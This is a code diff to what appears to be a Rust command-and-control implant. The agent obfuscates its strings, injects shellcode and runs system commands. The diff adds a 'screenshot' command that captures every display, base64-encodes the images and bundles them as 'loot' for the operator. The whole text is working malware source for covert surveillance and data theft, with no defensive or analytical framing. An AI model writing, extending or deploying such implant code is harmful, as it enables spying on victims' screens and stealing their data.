@@ -20,8 +20,11 @@ use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use sha2::Sha256;
 use std::time::{SystemTime, UNIX_EPOCH};
+use std::io::Cursor;
 use tokio::sync::Mutex;
 use uuid::Uuid;
+use screenshots::Screen;
+use image::ImageOutputFormat;
 
 type HmacSha256 = Hmac<Sha256>;
 
@@ -172,7 +175,7 @@ async fn register_agent(
 ) -> Result<(), Box<dyn std::error::Error>> {
     let reg = AgentRegistration {
         uuid: state.agent_id.clone(),
-        name: format!("{}-{}", obfstr!("A"), &state.agent_id[..8]),
+        name: state.agent_id.clone(),
         ip: get_local_ip(),
         os: get_os_info(),
         reconnect_interval: state.reconnect_interval,
@@ -296,6 +299,8 @@ async fn execute_command(cmd: &str, state: &mut AgentState, client: &Client) -> 
         handle_jitter(&args, state).await
     } else if cmd_name == obfstr!("injectsc") {
         Ok(inject::handle_inject_sc(&args)?)
+    } else if cmd_name == obfstr!("screenshot") {
+        handle_screenshot().await
     } else {
         exec_system_command(cmd).await
     }
@@ -638,6 +643,43 @@ async fn handle_jitter(args: &[String], state: &mut AgentState) -> Result<String
 
     state.jitter_seconds = new_jitter;
     Ok(obfstr!("ok"))
+}
+
+async fn handle_screenshot() -> Result<String, Box<dyn std::error::Error>> {
+    let screens = Screen::all()?;
+    let mut result = String::new();
+    let mut loot_entries = Vec::new();
+
+    for (i, screen) in screens.iter().enumerate() {
+        let image = screen.capture()?;
+        let mut buffer = Vec::new();
+        image.write_to(&mut Cursor::new(&mut buffer), ImageOutputFormat::Png)?;
+        
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)?
+            .as_secs();
+            
+        let filename = format!("screenshot_{}_{}.png", timestamp, i);
+        let hash = format!("{:x}", md5::compute(&buffer));
+        
+        let loot_entry = json!({
+            "type": "file",
+            "name": filename,
+            "path": "", // Empty path indicates loose file
+            "size": buffer.len(),
+            "content": general_purpose::STANDARD.encode(&buffer),
+            "md5": hash,
+        });
+        
+        loot_entries.push(loot_entry);
+        result.push_str(&format!("Captured screen {} ({} bytes)\n", i, buffer.len()));
+    }
+
+    if !loot_entries.is_empty() {
+        result.push_str(&format!("\n{}:{}", obfstr!("LOOT_ENTRIES"), serde_json::to_string(&loot_entries)?));
+    }
+
+    Ok(result)
 }
 
 fn clean_path(path: &Path) -> String {
